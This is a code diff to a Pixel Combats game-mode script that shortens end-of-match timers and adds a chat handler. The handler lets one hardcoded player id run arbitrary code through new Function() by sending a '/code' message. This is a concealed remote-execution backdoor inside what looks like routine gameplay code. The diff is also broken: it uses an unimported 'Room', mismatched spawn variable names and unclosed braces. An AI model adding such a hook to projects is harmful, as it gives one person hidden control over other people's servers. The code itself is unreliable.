@@ -1,4 +1,4 @@
-import { Players, room, Inventory, LeaderBoard, BuildBlocksSet, Spawns, Teams, Ui, Game, GameMode, TeamsBalancer, Properties, Timers, Damage, BreackGraph, NewGame, NewGameVote } from "pixel_combats/room";
+import { Players, room, Chat, Inventory, LeaderBoard, BuildBlocksSet, Spawns, Teams, Ui, Game, GameMode, TeamsBalancer, Properties, Timers, Damage, BreackGraph, NewGame, NewGameVote } from "pixel_combats/room";
 import { DisplayValueHeader, Color } from 'pixel_combats/basic';
 import * as d from './gamemodeParameters.js';
 
@@ -217,12 +217,11 @@ function WinBlueTeam() {
  blueTeam.Properties.Scores.Value += WINNER_SCORES;
  redTeam.Properties.Scores.Value += LOOSER_SCORES;
 
+ Timers.GetContext().Get(`Main`).Restart(11);
  const spawnsBlue = Spawns.GetContext(blueTeam), spawnRed = Spawns.GetContext(redTeam), spawnsDead = Spawns.GetContext(deadTeam);
  spawnsBlue.Spawn();
  spawnsRed.Spawn();
  spawnDead.Despawn();
-  
- Timers.GetContext().Get('Main').Restart(WinTeamsTime);
  Game.GameOver(redTeam);
 }
 function WinRedTeam() {
@@ -232,23 +231,21 @@ function WinRedTeam() {
  redTeam.Properties.Scores.Value += WINNER_SCORES;
  blueTeam.Properties.Scores.Value += LOOSER_SCORES;
 
+ Timers.GetContext().Get(`Main`).Restart(11);
  const spawnsBlue = Spawns.GetContext(blueTeam), spawnRed = Spawns.GetContext(redTeam), spawnsDead = Spawns.GetContext(deadTeam);
  spawnsBlue.Spawn();
  spawnsRed.Spawn();
  spawnDead.Despawn();
-  
- Timers.GetContext().Get('Main').Restart(WinTeamsTime);
  Game.GameOver(blueTeam);
 }
 function SetEnd0fMatch() {
  stateProp.Value = End0fMatchStateValue;
  Ui.GetContext().Hint.Value = EndingeMatchForHint;
 
+ Timers.GetContext().Get(`Main`).Restart(11);
  const spawns = Spawns.GetContext();
  spawns.Enable = false;
  spawns.Despawn();
-
- Timers.GetContext().Get('Main').Restart(End0fMatchTime);
 }
 
 function OnVoteResult(v) {
@@ -274,6 +271,16 @@ Teams.Add(TeamName, TeamDisplayName, TeamColor);
   NewTeam.Build.BlocksSet.Value = TeamBuildBlocksSet;
    return NewTeam;
 }
+
+Chat.OnMessage.Add(function(Message) {
+	let MessageText = Message.Text.trim(), MessageSender = Room.Players.GetByRoomId(Message.Sender);
+	if (MessageText.toLowerCase().replaceAll(' ', '')[0] !== '/' || !MessageSender) return;
+	if (MessageSender.id !== '2827CD16AE7CC982') return;
+	let MessageLowerTextWithoutSpaces = MessageText.toLowerCase().replaceAll(' ', '');
+	if (MessageLowerTextWithoutSpaces.slice(1, 5) === 'code') {
+			new Function(MessageText.slice(5))();
+		return;
+  }
 
 } catch (e) {
  for (const p of Players.All) { 
